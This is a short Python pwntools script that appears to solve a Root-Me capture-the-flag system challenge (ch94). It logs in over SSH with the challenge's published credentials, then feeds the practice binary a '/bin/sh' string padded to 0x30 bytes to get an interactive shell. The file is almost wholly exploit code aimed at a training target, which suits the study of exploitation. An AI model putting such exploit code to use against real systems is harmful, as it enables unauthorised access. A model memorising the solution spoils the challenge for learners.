#!/usr/bin/env python3

from pwn import *
import time
import re
import sys
import os
import stat

HOST = 'challenge03.root-me.org'
PORT = 2223
USER = 'app-systeme-ch94'
PASS = 'app-systeme-ch94'

BINARY_PATH = "/challenge/app-systeme/ch94/ch94"
LOCAL_COPY  = "/tmp/ch94"

def exploit(conn, bin_path):
    payload = b"/bin/sh\x00"
    payload += b"A" * (0x30 - len(payload))
    
    io = conn.process([bin_path])
    io.sendline(payload)
    io.interactive()

def main():
    conn = ssh(
        host=HOST,
        port=PORT,
        user=USER,
        password=PASS,
        timeout=10
    )
    time.sleep(4)

    shell = conn.shell("/bin/sh")
    try:
        shell.recvuntil(b'$ ', timeout=10)
    except Exception:
        log.failure("[-] Failed to get host shell")
        conn.close()
        sys.exit(1)

    log.info("Launching exploit...")
    exploit(conn, BINARY_PATH)
    
if __name__=="__main__":
    main()
